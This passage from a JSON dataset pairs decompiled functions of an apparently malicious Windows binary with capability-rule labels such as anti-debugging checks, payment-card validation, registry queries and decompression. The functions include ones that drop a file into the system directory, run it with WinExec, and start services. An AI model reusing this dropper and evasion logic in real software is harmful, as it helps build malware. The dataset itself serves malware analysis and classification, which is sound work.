        "decompiled_code": "\nbool fcn.00402bb0(void)\n\n{\n    int32_t iVar1;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    iVar1 = fcn.00402610(0x80000002, 0x410920, 0x410960, &var_8h, &var_10ch, &var_4h);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(&var_10ch, 0);\n    return iVar1 != -1;\n}\n",
        "token_count": 149
    },
    "00401470": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004014df) overlaps instruction at (ram,0x004014de)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x004014df)\n// WARNING: Removing unreachable block (ram,0x004014ad)\n\nbool __cdecl fcn.00401470(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    int32_t iVar3;\n    uint *puVar4;\n    char cVar5;\n    char cVar6;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    lpBuffer = 0;\n    cVar6 = '\\0';\n    cVar5 = '\\0';\n    puVar4 = &var_10bh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    var_8h = 0;\n    *(puVar4 + 2) = 0;\n    uVar2 = fcn.00402d30();\n    if ((cVar6 == cVar5) && (cVar6 != cVar5)) {\n        out(0xc4, uVar2);\n        *(puVar4 + 3) = uVar2;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        uVar2 = fcn.00403c90();\n        arg_ch_00 = fcn.00403c90();\n        arg_ch_01 = fcn.00403c90();\n        fcn.004016c0(arg_10h, uVar2);\n        fcn.004016c0(arg_8h, arg_ch_00);\n        fcn.004016c0(arg_ch, arg_ch_01);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x4104c4, &lpBuffer, arg_10h);\n        iVar3 = fcn.00401410(&var_314h);\n        if (iVar3 != 0) {\n            (*pcVar1)(&var_210h, str.eZ7Iy, &lpBuffer, arg_8h);\n            iVar3 = fcn.00401410(&var_210h);\n            if (iVar3 != 0) {\n                (*pcVar1)(&var_210h, str.eZ7Iy, &lpBuffer, arg_ch);\n                iVar3 = fcn.00401410(&var_210h);\n                if (iVar3 != 0) {\n                    iVar3 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar3 = var_8h;\n    } while (var_4h < 3);\n    fcn.004016c0(arg_14h, 4);\n    return iVar3 != 0;\n}\n",
        "token_count": 777
    },
    "00401750": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00401750(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    uStack2088 = NULL;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.004016c0(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x4108e4, acStack1304, &uStack2112);\n    uStack2088 = str._KOLw;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x4109b4;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00403940(auStack1564, 0x4108e0, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1848
    },
    "00403940": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040399b) overlaps instruction at (ram,0x00403999)\n// \n\nvoid __cdecl fcn.00403940(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    uint8_t extraout_CH;\n    uint8_t extraout_DL;\n    int32_t unaff_EBX;\n    bool bVar4;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)(filename, mode);\n    if (iVar1 == 0) {\n        return;\n    }\n    (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems, iVar1);\n    bVar4 = (extraout_CH | extraout_DL | 0x1f) < '\\0';\n    iVar2 = (*_sym.imp.MSVCRT.dll_fflush)(iVar1);\n    if ((bVar4) || (!bVar4)) {\n        iVar2 = 0x4039a2;\n        unaff_EBX = iVar1;\n        (*_sym.imp.MSVCRT.dll_fclose)();\n        iVar1 = iVar2;\n        iVar2 = 1;\n    }\n    pcVar3 = iVar2 + -0x4bea00a9;\n    *(unaff_EBX + 0x1b808c4) = *(unaff_EBX + 0x1b808c4) + pcVar3;\n    *pcVar3 = *pcVar3 + pcVar3;\n    *(iVar1 + 0x5b) = *(iVar1 + 0x5b) + unaff_EBX;\n    return;\n}\n",
        "token_count": 374
    },
    "00401d10": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401e44) overlaps instruction at (ram,0x00401e41)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401d10(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint32_t arg_1ch)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    int32_t extraout_ECX;\n    int32_t iVar3;\n    int32_t extraout_ECX_00;\n    uint32_t extraout_ECX_01;\n    uint extraout_EDX;\n    uint uVar4;\n    uint unaff_EBX;\n    uint32_t unaff_ESI;\n    uint32_t uVar5;\n    uint *puVar6;\n    uint *unaff_EDI;\n    uint *puVar7;\n    bool bVar8;\n    bool bVar9;\n    bool bVar10;\n    unkbyte6 Var11;\n    uchar var_24h;\n    uint var_23h;\n    uint *var_4h;\n    \n    do {\n        Var11 = fcn.00401c70(arg_18h, arg_1ch, 0x4104f4, 7);\n        var_4h = Var11;\n        bVar8 = var_4h == NULL;\n        if (bVar8) {\n            return 0;\n        }\n        if (bVar8) {\ncode_r0x00401da0:\n            iVar3 = 7;\n        }\n        else {\n            if (!bVar8) goto code_r0x00401da0;\n            uVar4 = in(Var11 >> 0x20);\n            *unaff_EDI = uVar4;\n            iVar3 = extraout_ECX;\n            if (&stack0xffffffcc < 1) {\n                *(unaff_ESI - 0x7b) = *(unaff_ESI - 0x7b);\n                return 0;\n            }\n        }\n        *(iVar3 + 7) = *(iVar3 + 7) ^ unaff_EBX >> 8;\n        unaff_EDI = _sym.imp.MSVCRT.dll_rand;\n        var_24h = 0;\n        puVar6 = &var_23h;\n        for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        *puVar6 = 0;\n        *(puVar6 + 2) = 0;\n        bVar10 = false;\n        bVar9 = false;\n        bVar8 = true;\n        unaff_ESI = 0;\n        while ((bVar8 || bVar10 != bVar9 || (!bVar8 && bVar10 == bVar9))) {\n            uVar2 = (*unaff_EDI)();\n            uVar2 = uVar2 & 0x800000ff;\n            if (uVar2 < 0) {\n                uVar2 = (uVar2 - 1 | 0xffffff00) + 1;\n            }\n            (&var_24h)[unaff_ESI] = uVar2;\n            uVar5 = unaff_ESI + 1;\n            bVar10 = SBORROW4(uVar5, 0x20);\n            bVar9 = unaff_ESI - 0x1f < 0;\n            bVar8 = uVar5 == 0x20;\n            iVar3 = extraout_ECX_00;\n            unaff_ESI = uVar5;\n            if (0x1f < uVar5) {\n                puVar6 = &var_24h;\n                puVar7 = var_4h;\n                for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar7 = *puVar6;\n                    puVar6 = puVar6 + 1;\n                    puVar7 = puVar7 + 1;\n                }\n                bVar8 = ((uVar2 ^ 0x687c) & 0x3000) == 0;\n                uVar1 = fcn.00402840(arg_8h, arg_ch, arg_10h, arg_14h, &var_24h, 0x20, var_4h);\n                if (!bVar8) {\n                    uVar2 = (extraout_ECX_01 >> 8 & 0xffff00) << 8 | extraout_ECX_01 & 0xffff;\n                    uVar4 = extraout_EDX;\n                    if (bVar8) goto code_r0x00401e3d;\n                }\n                uVar2 = arg_1ch;\n                uVar4 = arg_18h;\ncode_r0x00401e3d:\n                *(uVar2 + 0x52) = (*(uVar2 + 0x52) - uVar4) - (uVar1 < 0x8b);\n                fcn.00403e60(&stack0xfffffffc, 0x47);\n                return 1;\n            }\n        }\n        if (iVar3 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    } while( true );\n}\n",
        "token_count": 1179
    },
    "00402200": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004022c1) overlaps instruction at (ram,0x004022c0)\n// \n\nint32_t __cdecl fcn.00402200(uint arg_8h, int32_t arg_ch, uint *arg_10h, int32_t *arg_14h)\n\n{\n    uint8_t uVar1;\n    uint16_t uVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    bool bVar9;\n    uint8_t in_AF;\n    ulong uVar10;\n    \n    uVar2 = fcn.00402a90(0, arg_8h, arg_ch + 1U >> 1);\n    bVar9 = false;\n    uVar10 = (*_sym.imp.dbghelp.dll_ImageNtHeader)(arg_8h);\n    iVar5 = uVar10;\n    piVar3 = *(iVar5 + 0x58);\n    if ((!bVar9) && (bVar9)) {\n        iVar5 = iVar5 + *(iVar5 + 0x69 + (uVar10 >> 0x20) * 4) + bVar9;\n    }\n    if (uVar2 < piVar3) {\n        iVar6 = (uVar2 - piVar3 & 0xffff) - 1;\n    }\n    else {\n        iVar6 = uVar2 - (piVar3 & 0xffff);\n    }\n    while( true ) {\n        uVar4 = piVar3 >> 0x10;\n        uVar2 = piVar3 >> 0x10;\n        if (iVar6 < uVar2) {\n            if (uVar2 < iVar6) {\n                uVar4 = uVar4 & 0xff | (piVar3 >> 0x18) << 8;\n            }\n            uVar8 = iVar6 - uVar4 & 0xffff;\n            bVar9 = SBORROW4(uVar8, 1);\n            iVar7 = uVar8 - 1;\n        }\n        else {\n            bVar9 = SBORROW4(iVar6, uVar4);\n            iVar7 = iVar6 - uVar4;\n        }\n        if ((!bVar9) && (bVar9)) {\n            LOCK();\n            iVar7 = 0x138b2633;\n        }\n        iVar6 = iVar7 + arg_ch;\n        *arg_14h = iVar6;\n        if ((iVar6 == 0 || SCARRY4(iVar7, arg_ch) != iVar6 < 0) || (iVar6 != 0 && SCARRY4(iVar7, arg_ch) == iVar6 < 0))\n        break;\n        in_AF = 9 < (arg_14h & 0xf) | in_AF;\n        uVar1 = arg_14h + in_AF * '\\x06';\n        piVar3 = arg_14h & 0xffff0000 | CONCAT11((arg_14h >> 8) + in_AF, uVar1) & 0xff0f;\n        if (uVar4 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        *piVar3 = *piVar3 + 1;\n        *(iVar6 + 0xf) = *(iVar6 + 0xf);\n        *(piVar3 * 2) = 0;\n        *piVar3 = *piVar3 + (uVar1 & 0xf);\n    }\n    *arg_10h = *(iVar5 + 0x58);\n    return iVar5;\n}\n",
        "token_count": 813
    },
    "00402a90": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402ae0) overlaps instruction at (ram,0x00402adf)\n// \n// WARNING: Removing unreachable block (ram,0x00402ad2)\n// WARNING: Removing unreachable block (ram,0x00402adc)\n// WARNING: Removing unreachable block (ram,0x00402ae0)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t fcn.00402a90(uint32_t param_1, uint16_t *param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = param_1;\n    if (param_3 != 0) {\n        param_1 = param_3;\n        do {\n            uVar1 = uVar1 + *param_2;\n            if (uVar1 >> 0x10 != 0) {\n                uVar1 = (uVar1 >> 0x10) + (uVar1 & 0xffff);\n            }\n            param_2 = param_2 + 1;\n            param_1 = param_1 + -1;\n        } while (param_1 != 0);\n    }\n    return (uVar1 >> 0x10) + uVar1;\n}\n",
        "token_count": 278
    },
    "00402610": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool __cdecl fcn.00402610(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)();\n    if (iVar1 != 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)();\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_4h);\n    return iVar1 == 0;\n}\n",
        "token_count": 164
    },
    "null": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid entry0(void)\n\n{\n    uint *puVar1;\n    uint argv;\n    uint8_t *puVar2;\n    uint *in_FS_OFFSET;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint lpStartupInfo;\n    uint32_t var_30h;\n    uint var_2ch;\n    uchar *var_18h;\n    uint *var_14h;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x405128;\n    uStack16 = 0x404620;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack20;\n    var_18h = &stack0xffffff78;\n    var_4h = 0;\n    (*_sym.imp.MSVCRT.dll___set_app_type)(2);\n    *0x41fa28 = 0xffffffff;\n    *0x41fa2c = 0xffffffff;\n    puVar1 = (*_sym.imp.MSVCRT.dll___p__fmode)();\n    *puVar1 = *0x41fa24;\n    puVar1 = (*_sym.imp.MSVCRT.dll___p__commode)();\n    *puVar1 = *0x41fa20;\n    *0x41fa30 = *_sym.imp.MSVCRT.dll__adjust_fdiv;\n    fcn.004047a5();\n    if (*0x41f9e0 == 0) {\n        (*_sym.imp.MSVCRT.dll___setusermatherr)(0x4047a2);\n    }\n    fcn.00404790();\n    sub.MSVCRT.dll__initterm(0x406008, 0x40600c);\n    var_6ch = *0x41fa1c;\n    (*_sym.imp.MSVCRT.dll___getmainargs)(&var_60h, &var_70h, &var_64h, *0x41fa18, &var_6ch);\n    sub.MSVCRT.dll__initterm(0x406000, 0x406004);\n    puVar2 = *_sym.imp.MSVCRT.dll__acmdln;\n    if (*puVar2 != 0x22) {\n        do {\n            if (*puVar2 < 0x21) goto code_r0x00404719;\n            puVar2 = puVar2 + 1;\n        } while( true );\n    }\n    do {\n        puVar2 = puVar2 + 1;\n        if (*puVar2 == 0) break;\n    } while (*puVar2 != 0x22);\n    if (*puVar2 != 0x22) goto code_r0x00404719;\n    do {\n        puVar2 = puVar2 + 1;\ncode_r0x00404719:\n    } while ((*puVar2 != 0) && (*puVar2 < 0x21));\n    var_30h = 0;\n    (*_sym.imp.KERNEL32.dll_GetStartupInfoA)(&lpStartupInfo);\n    if ((var_30h & 1) == 0) {\n        var_2ch._0_2_ = 10;\n    }\n    argv = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0, 0, puVar2, var_2ch);\n    var_68h = main(argv);\n    (*_sym.imp.MSVCRT.dll_exit)(var_68h);\n    sub.MSVCRT.dll__XcptFilter(**var_14h, var_14h);\n    return;\n}\n",
        "token_count": 835
    },
    "00402cd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00402cd0(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00403cb0;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x4109bc;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 219
    },
    "00403f60": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403f60(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x420) {\n            iVar3 = (*pcVar1)();\n            if (iVar3 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 242
    },
    "00401070": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040109e) overlaps instruction at (ram,0x00401099)\n// \n// WARNING: Removing unreachable block (ram,0x00401092)\n// WARNING: Removing unreachable block (ram,0x00401098)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid fcn.00401070(uint *param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar uStack108;\n    uint uStack107;\n    uint uStack8;\n    \n    uStack8 = 0;\n    uStack108 = 0;\n    puVar2 = &uStack107;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00401100(&uStack108, &uStack8);\n    fcn.00402c40(&uStack108, uStack8, 0x406010, 0xa4a0);\n    *param_1 = 0x406010;\n    *param_2 = 0xa4a0;\n    return;\n}\n",
        "token_count": 302
    },
    "00401950": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401a1f) overlaps instruction at (ram,0x00401a1e)\n// \n\nuint __cdecl fcn.00401950(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *extraout_ECX;\n    uint *arg_ch;\n    uint extraout_ECX_00;\n    uint nitems;\n    uint extraout_EDX;\n    uint ptr;\n    uint *puVar2;\n    uint32_t uVar3;\n    uchar uVar4;\n    uint8_t uVar5;\n    bool bVar6;\n    uint var_20fh;\n    uchar s;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar2 = &var_20fh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    s = 0;\n    puVar2 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    uVar4 = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    if ((uVar4) || (arg_ch = extraout_ECX,  !uVar4)) {\n        arg_ch = &var_8h;\n    }\n    uVar3 = puVar2 + 3U ^ *(puVar2 + 0xe58be76);\n    bVar6 = uVar3 == 0;\n    uVar5 = (POPCOUNT(uVar3 & 0xff) & 1U) == 0;\n    fcn.004044f0(&var_4h, arg_ch);\n    if ((!bVar6) && (bVar6)) {\n        uVar5 = ((uVar5 & 1) * '\\x04' & 4) != 0;\n    }\n    fcn.00401a80();\n    if (!uVar5) {\n        nitems = extraout_ECX_00;\n        ptr = extraout_EDX;\n        if (uVar5) goto code_r0x00401a1e;\n    }\n    nitems = var_8h;\n    ptr = var_4h;\ncode_r0x00401a1e:\n    iVar1 = fcn.00403940(&s, 0x4104e4, ptr, nitems);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    fcn.00402090();\n    return 1;\n}\n",
        "token_count": 668
    },
    "00401c70": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nchar * __cdecl fcn.00401c70(char *arg_8h, int32_t arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char *pcVar4;\n    bool bVar5;\n    \n    pcVar3 = arg_8h + (arg_ch - arg_14h);\n    if (arg_14h != 0) {\n        if (arg_8h <= pcVar3) {\n            do {\n                if (*arg_8h == *arg_10h) {\n                    bVar5 = true;\n                    iVar1 = arg_14h;\n                    pcVar2 = arg_8h;\n                    pcVar4 = arg_10h;\n                    do {\n                        pcVar4 = pcVar4 + 1;\n                        pcVar2 = pcVar2 + 1;\n                        iVar1 = iVar1 + -1;\n                        if (iVar1 == 0) break;\n                        bVar5 = *pcVar2 == *pcVar4;\n                    } while (bVar5);\n                    if (bVar5) {\n                        return arg_8h;\n                    }\n                }\n                arg_8h = arg_8h + 1;\n            } while (arg_8h <= pcVar3);\n        }\n        arg_8h = NULL;\n    }\n    return arg_8h;\n}\n",
        "token_count": 326
    },
    "004026c0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040270a) overlaps instruction at (ram,0x00402709)\n// \n// WARNING: Removing unreachable block (ram,0x004026eb)\n\nbool fcn.004026c0(void)\n\n{\n    char cVar1;\n    uchar in_AL;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    uint32_t uVar3;\n    uint8_t *unaff_EBX;\n    uint *puVar4;\n    uint *puVar5;\n    uchar *puVar6;\n    uint32_t unaff_EDI;\n    char *pcVar7;\n    uint16_t in_ES;\n    bool bVar8;\n    char in_SF;\n    char in_OF;\n    uint uStack20;\n    uchar *puStack16;\n    uint32_t pvData;\n    \n    puVar4 = &stack0xfffffffc;\n    pvData = 0;\n    if ((in_OF == in_SF) && (in_OF != in_SF)) {\n        pvData = in_ES;\n        *(unaff_EDI | &stack0xfffffffc) = in_AL;\n    }\n    puStack16 = 0x4026ef;\n    iVar2 = fcn.00402da0(&fcn.004026c0::pvData);\n    if (iVar2 == 0) {\n        return false;\n    }\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    bVar8 = *(unaff_EBX + -0x3f7a03bb) == 